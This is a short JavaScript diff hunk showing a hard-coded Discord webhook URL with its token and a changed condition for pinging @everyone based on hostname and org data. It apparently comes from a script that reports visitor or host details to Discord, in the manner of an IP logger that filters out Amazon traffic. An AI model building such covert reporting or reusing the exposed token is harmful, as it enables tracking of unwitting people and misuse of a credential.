@@ -25,7 +25,7 @@
                 const webhook = "https://discord.com/api/webhooks/1379230917817536642/PbvgGVenORz5CNd0TL2ol084jmLfQ2w_78rBqg3ix2iVv9CombYp8zzmc1ODZncYfL70";
 
                 // Determine if @everyone should be pinged
-                const shouldPing = (hostname !== 'Unknown') || (!org.toLowerCase().includes('amazon'));
+                const shouldPing = (info.hostname) || false;
 
                 const ping = shouldPing ? '@everyone\n' : '';
 
